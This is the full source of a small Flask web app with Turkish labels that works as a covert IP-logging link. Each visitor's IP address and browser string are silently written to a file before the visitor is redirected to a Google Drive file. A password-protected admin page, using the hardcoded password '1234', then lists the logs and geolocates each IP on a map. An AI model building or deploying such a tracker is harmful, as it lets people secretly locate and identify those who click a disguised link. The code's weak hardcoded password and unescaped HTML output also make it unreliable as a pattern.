from flask import Flask, request, render_template_string, redirect
from datetime import datetime
import requests

app = Flask(__name__)

ADMIN_PASSWORD = "1234"

HTML_TEMPLATE = """
<h1>📜 Ziyaretçi Logları</h1>
{% for log in logs %}
    <p>
        {{ log }} 
        <a href="/map/{{ log.split('|')[1].split(':')[1].strip() }}" target="_blank">📍 Konumu Göster</a>
    </p>
{% endfor %}
"""

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = ip.split(",")[0].strip()

    ua = request.headers.get("User-Agent")
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("log.txt", "a") as f:
        f.write(f"{time} | IP: {ip} | UA: {ua}\n")

    return redirect("https://drive.google.com/file/d/18ToI0h-n8fPCo18nL6jkrJDk_kw2w0Vl/view?usp=sharing")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        password = request.form.get("password")
        if password == ADMIN_PASSWORD:
            with open("log.txt", "r") as f:
                logs = f.readlines()
            return render_template_string(HTML_TEMPLATE, logs=logs)
        return "<h1>❌ Yanlış şifre!</h1>"

    return '''
    <form method="POST">
        <input type="password" name="password" placeholder="Şifre">
        <button type="submit">Giriş</button>
    </form>
    '''

@app.route("/map/<ip>")
def show_map(ip):
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/").json()
        lat, lon = response.get("latitude"), response.get("longitude")
        city, country = response.get("city"), response.get("country_name")

        if lat and lon:
            return f"""
            <h1>{ip} - {city}, {country}</h1>
            <iframe 
                src="https://www.openstreetmap.org/export/embed.html?bbox={lon-0.01}%2C{lat-0.01}%2C{lon+0.01}%2C{lat+0.01}&layer=mapnik&marker={lat}%2C{lon}" 
                width="800" height="600"></iframe>
            """
        else:
            return "<h1>Konum bulunamadı.</h1>"
    except:
        return "<h1>API hatası!</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
